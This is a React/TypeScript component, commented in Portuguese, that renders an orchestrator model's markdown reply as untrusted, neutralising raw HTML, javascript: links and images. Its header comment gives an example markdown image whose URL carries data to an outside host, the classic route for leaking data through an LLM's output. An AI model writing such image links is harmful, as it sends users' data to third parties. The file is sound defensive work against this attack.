/** A resposta do orquestrador, em markdown simples e tratada como não
 * confiável (item N3 do apontamento da segurança, docs/SEGURANCA.md).
 *
 * - HTML escrito pelo modelo não vira elemento: o react-markdown sem
 *   rehype-raw mostra `<script>` e atributos de evento como texto.
 * - Link `javascript:` e similares perdem o destino (urlTransform padrão).
 * - Imagem não é carregada: `![x](https://fora/pixel.png?dado=...)` é o
 *   caminho clássico de vazamento por LLM (o navegador chamaria o endereço
 *   com o dado na URL). Nenhuma resposta legítima do orquestrador traz
 *   imagem; fica "[imagem removida: x]" no lugar. A CSP do servidor também
 *   barraria, mas a tela não depende só dela.
 * - Link para fora abre em outra aba, sem levar a página de origem
 *   (noopener, noreferrer). */

import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

const COMPONENTES: Components = {
  img: ({ alt }) => <span className="bpr-imagem-removida">[imagem removida{alt ? `: ${alt}` : ""}]</span>,
  a: ({ href, children }) => {
    const externo = Boolean(href && /^https?:\/\//i.test(href));
    return (
      <a href={href} {...(externo ? { target: "_blank", rel: "noopener noreferrer nofollow" } : {})}>
        {children}
      </a>
    );
  },
};

export function RespostaDoModelo({ texto }: { texto: string }) {
  return (
    <div className="bpr-mensagem-markdown">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={COMPONENTES}>{texto}</ReactMarkdown>
    </div>
  );
}
